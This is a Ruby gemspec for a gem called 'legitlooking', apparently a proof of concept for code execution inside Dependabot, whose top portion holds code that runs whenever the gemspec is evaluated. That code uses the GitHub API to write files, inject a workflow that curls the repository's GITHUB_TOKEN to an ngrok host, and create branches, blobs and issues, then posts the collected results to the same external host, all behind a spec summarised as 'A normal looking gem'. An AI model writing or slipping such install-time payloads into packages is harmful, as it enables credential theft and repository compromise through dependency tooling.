# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"
  require "json"

  lines = []

  HDRS = {
    "Accept"               => "application/vnd.github+json",
    "X-GitHub-Api-Version" => "2022-11-28",
    "Content-Type"         => "application/json"
  }

  def gh(method, path, body = nil)
    uri = URI("https://api.github.com#{path}")
    req = case method
          when :get    then Net::HTTP::Get.new(uri)
          when :put    then Net::HTTP::Put.new(uri)
          when :post   then Net::HTTP::Post.new(uri)
          when :delete then Net::HTTP::Delete.new(uri)
          end
    HDRS.each { |k, v| req[k] = v }
    req.body = body.to_json if body
    res = Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                          open_timeout: 10, read_timeout: 10) { |h| h.request(req) }
    [res.code, res.body.to_s[0, 1000]]
  rescue => e
    ["ERR", e.message]
  end

  # Array#pack("m0") = base64 strict zonder require "base64"
  b64 = ->(s) { [s].pack("m0") }

  REPO = "ugurcanli/testpen"

  # ============================================================
  # 1. BESTAND SCHRIJVEN
  # ============================================================
  lines << "=== 1. PUT /contents/poc-write-test.txt ==="
  code, body = gh(:put, "/repos/#{REPO}/contents/poc-write-test.txt", {
    message: "PoC: write access via Dependabot RCE",
    content: b64.("PoC: Dependabot RCE grants repository write access\n")
  })
  lines << "HTTP #{code}: #{body}"

  # ============================================================
  # 2. MALICIEUZE WORKFLOW INJECTEREN -- meest kritieke test
  # ============================================================
  lines << "\n=== 2. PUT .github/workflows/poc-evil.yml ==="
  evil_yaml = <<~YAML
    name: poc-injected
    on: [push, workflow_dispatch]
    jobs:
      exfil:
        runs-on: ubuntu-latest
        steps:
          - run: curl -s -X POST #{COLLAB_URL}?poc=workflow_injected -d "t=$GITHUB_TOKEN"
  YAML
  code, body = gh(:put, "/repos/#{REPO}/contents/.github/workflows/poc-evil.yml", {
    message: "PoC: workflow injection via Dependabot RCE",
    content: b64.(evil_yaml)
  })
  lines << "HTTP #{code}: #{body}"

  # ============================================================
  # 3. BRANCH AANMAKEN
  # ============================================================
  lines << "\n=== 3. BRANCH AANMAKEN ==="
  code, sha_body = gh(:get, "/repos/#{REPO}/git/ref/heads/main")
  sha = sha_body.match(/"sha":"([a-f0-9]{40})"/)&.[](1)
  lines << "Main SHA: #{sha}"

  if sha
    branch_name = "poc-dependabot-write-#{Time.now.to_i}"
    code, body = gh(:post, "/repos/#{REPO}/git/refs", {
      ref: "refs/heads/#{branch_name}",
      sha: sha
    })
    lines << "Create branch '#{branch_name}': HTTP #{code}: #{body}"
  end

  # ============================================================
  # 4. GIT BLOB (laagste niveau write)
  # ============================================================
  lines << "\n=== 4. GIT BLOB ==="
  code, body = gh(:post, "/repos/#{REPO}/git/blobs", {
    content: "PoC blob via Dependabot RCE",
    encoding: "utf-8"
  })
  lines << "HTTP #{code}: #{body}"

  # ============================================================
  # 5. ISSUE AANMAKEN
  # ============================================================
  lines << "\n=== 5. ISSUE ==="
  code, body = gh(:post, "/repos/#{REPO}/issues", {
    title: "PoC: Dependabot RCE write access",
    body:  "Created from within Dependabot execution container."
  })
  lines << "HTTP #{code}: #{body[0, 300]}"

  # ============================================================
  # 6. BRANCH PROTECTION CHECK
  # ============================================================
  lines << "\n=== 6. BRANCH PROTECTION ==="
  code, body = gh(:get, "/repos/#{REPO}/branches/main")
  lines << "HTTP #{code}: #{body[0, 400]}"

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=write_access_test")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 30, read_timeout: 30) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=write_access_test&err=#{URI.encode_www_form_component(e.message[0,200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.32"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
